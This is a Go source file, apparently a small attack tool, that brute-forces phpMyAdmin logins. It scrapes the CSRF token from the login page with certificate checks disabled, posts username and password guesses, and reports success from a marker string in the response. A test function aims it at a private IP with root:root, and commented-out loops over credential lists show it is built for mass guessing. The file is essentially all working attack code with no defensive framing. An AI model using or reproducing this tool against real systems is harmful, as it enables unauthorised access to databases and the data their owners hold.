package phpmyadmin

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strings"
	"testing"
)

type Values map[string][]string

func (v Values) Add(key, value string) {
	v[key] = append(v[key], value)
}

func scan(url string, user string, password string) {
	//for _, user := range users {
	//	for _, password := range passwords {

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	clt := http.Client{Transport: tr}

	req, _ := http.NewRequest("GET", url, nil)
	req.Close = true
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req.Header.Add("Connection", "close")
	req.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req.Header.Add("Accept-Charset", "utf-8")

	resp, err := clt.Do(req)
	if err != nil {
		log.Printf("Error making request: %v", err)
		return
	}

	data := make([]byte, 20250)
	c := bufio.NewReader(resp.Body)
	c.Read(data)
	resp.Body.Close()
	//content, _ := ioutil.ReadAll(resp.Body)
	r := regexp.MustCompile(`(?U)name="token" value="(.*)"`)
	match := r.FindStringSubmatch(string(data))
	if match == nil {
		return
	}
	token := strings.TrimSpace(match[1])

	formData := fmt.Sprintf("pma_username=%s&pma_password=%s&token=%s", user, password, token)
	println(formData)
	req2, err := http.NewRequest("POST", url, strings.NewReader(formData))
	req2.Close = true
	if err != nil {
		log.Printf("Error creating request: %v", err)
		return
		//continue
	}
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 添加其他请求头
	req2.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36")
	req2.Header.Add("Connection", "close")
	req2.Header.Add("Accept-Language", "zh-CN,zh;q=0.9")
	req2.Header.Add("Accept-Charset", "utf-8")

	// 发送请求
	resp2, err := http.DefaultClient.Do(req2)
	if err != nil {
		log.Printf("[-] Error making request: %v", err)
		println(resp2)
		println(url)
		//continue
		return
	}
	// 立即处理错误
	defer func() {
		if cerr := resp2.Body.Close(); cerr != nil {
			log.Printf("Error closing response body: %v", cerr)
		}
	}()

	// 读取响应体
	body, err := ioutil.ReadAll(resp2.Body)
	if err != nil {
		log.Printf("Error reading response body: %v", err)
		//continue
		return
	}

	fmt.Printf("当前爆破用户名 %s:%s\n", user, password)
	if resp2.StatusCode == http.StatusOK && strings.Contains(string(body), "li_pma_wiki") {
		fmt.Printf("[+] Success! %s:%s\n", user, password)
		return
	}

	//}
	//}
}

func TestRun(t *testing.T) {

	//users := []string{"root"}
	//passwords := []string{"root"}

	//users := []string{"admin", "root"}
	//passwords := []string{"123456", "admin", "root"}
	scan("http://192.168.181.173:8080", "root", "root")

}
